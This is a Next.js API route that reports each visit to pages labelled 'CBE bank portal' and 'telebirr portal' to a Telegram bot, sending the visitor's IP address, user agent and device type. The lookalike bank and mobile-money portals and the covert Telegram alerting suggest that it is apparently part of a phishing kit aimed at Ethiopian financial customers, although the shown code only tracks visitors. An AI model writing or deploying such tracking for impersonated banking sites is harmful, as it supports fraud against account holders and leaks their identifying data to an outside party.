import { NextRequest, NextResponse } from 'next/server';

// POST /api/visit { siteId, page } -> Telegram message.
// Configure in Vercel: TELEGRAM_BOT_TOKEN + TELEGRAM_CHAT_ID.
// Without them this is a silent no-op (local dev keeps working).

const NAMES: Record<string, string> = {
  'commercial-cbe': 'CBE bank portal (/cbe)',
  'telebirr-portal': 'telebirr portal (/telebirr)'
};

// Mobile vs PC from User-Agent, plus a short OS guess.
function deviceInfo(ua: string): string {
  if (!ua) return '❓ Unknown';
  const mobile = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Tablet/i.test(ua);
  let os = 'Unknown OS';
  let m: RegExpMatchArray | null;
  if ((m = ua.match(/Android ([\d.]+)/i))) os = `Android ${m[1]}`;
  else if ((m = ua.match(/iPhone OS ([\d_]+)/i))) os = `iOS ${m[1].replace(/_/g, '.')}`;
  else if ((m = ua.match(/iPad; CPU OS ([\d_]+)/i))) os = `iPadOS ${m[1].replace(/_/g, '.')}`;
  else if ((m = ua.match(/Windows NT ([\d.]+)/i))) os = `Windows ${m[1]}`;
  else if ((m = ua.match(/Mac OS X ([\d_]+)/i))) os = `macOS ${m[1].replace(/_/g, '.')}`;
  else if (/CrOS/i.test(ua)) os = 'ChromeOS';
  else if (/Linux/i.test(ua)) os = 'Linux';
  return `${mobile ? '📱 Mobile' : '💻 PC'} (${os})`;
}

export async function POST(req: NextRequest) {
  const body = await req.json().catch(() => ({}));
  const siteId = String(body.siteId || 'unknown').slice(0, 64);
  const page = String(body.page || 'visit').slice(0, 128);
  const token = process.env.TELEGRAM_BOT_TOKEN || '';
  const chatId = process.env.TELEGRAM_CHAT_ID || '';
  if (!token || !chatId) return NextResponse.json({ ok: true, notified: false });

  const ip =
    (req.headers.get('x-forwarded-for') || '').split(',')[0]?.trim() ||
    req.headers.get('x-real-ip')?.trim() ||
    'n/a';
  const ua = req.headers.get('user-agent') || 'n/a';
  const label = NAMES[siteId] || siteId;
  const text =
    `👁 Visitor on ${label}\n` +
    `Page: ${page}\n` +
    `Time: ${new Date().toISOString()}\n` +
    `IP: ${ip}\n` +
    `Device: ${deviceInfo(req.headers.get('user-agent') || '')}\n` +
    `UA: ${ua.slice(0, 120)}`;

  try {
    const r = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text })
    });
    const j = await r.json().catch(() => null);
    return NextResponse.json({ ok: true, notified: Boolean(j && j.ok) });
  } catch {
    return NextResponse.json({ ok: true, notified: false });
  }
}

export async function OPTIONS() {
  return new NextResponse(null, { status: 204 });
}
